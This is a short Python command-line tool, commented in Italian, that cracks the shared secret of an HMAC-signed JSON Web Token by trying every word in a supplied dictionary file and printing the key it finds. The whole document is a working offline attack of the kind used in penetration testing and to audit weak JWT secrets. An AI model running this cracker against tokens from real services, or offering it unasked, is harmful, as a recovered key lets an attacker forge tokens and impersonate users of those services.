from jwt import decode, InvalidTokenError, DecodeError, get_unverified_header
import sys
from tqdm import tqdm

# Classe vera e propria del crack
def jwt_crack(jwt, dictionary):
    header = get_unverified_header(jwt)
    with open(dictionary) as fp:
        for secret in tqdm(fp):
            secret = secret.rstrip()

            try:
                decode(jwt, secret, algorithms=[header["alg"]])
                return secret
            except DecodeError:
                # Signature fallita
                pass
            except InvalidTokenError:
                # Signature corretta ma ci sono altri errori
                return secret



# Verifica della struttura del JWT
def validazione_jwt(jwt):
    elementi = jwt.split(".")
    if len(elementi) != 3:
        return False

    return True

# Lettura del token
def leggi_jwt(jwt):
    if not validazione_jwt(jwt):
        with open(jwt) as fp:
            jwt = fp.read().strip()

    if not validazione_jwt(jwt):
        raise RuntimeError("L'elemento %s non è un JWT valido" % jwt)

    return jwt

# Controllo delle firme supportate (chiaramente solo chiave simmetrica)

def signature_supportata(jwt):
    header = get_unverified_header(jwt)
    return header["alg"] in ["HS256", "HS384", "HS512"]


# Main

def main(argv):
    if len(argv) != 3:
        print("Utilizzo: %s [Incollare il JWT o un file con JWT] [nome del dizionario] " % argv[0])
        return

    jwt = leggi_jwt(argv[1])
    if not signature_supportata(jwt):
        print("Errore: Algoritmo non supportato")
        return

    print("Provo a trovare la chiave del JWT %s" % jwt)
    result = jwt_crack(jwt, argv[2])
    if result:
        print("Ecco la chiave:", result)
    else:
        print("Chiave non presente nel dizionario")


if __name__ == "__main__":
    main(sys.argv)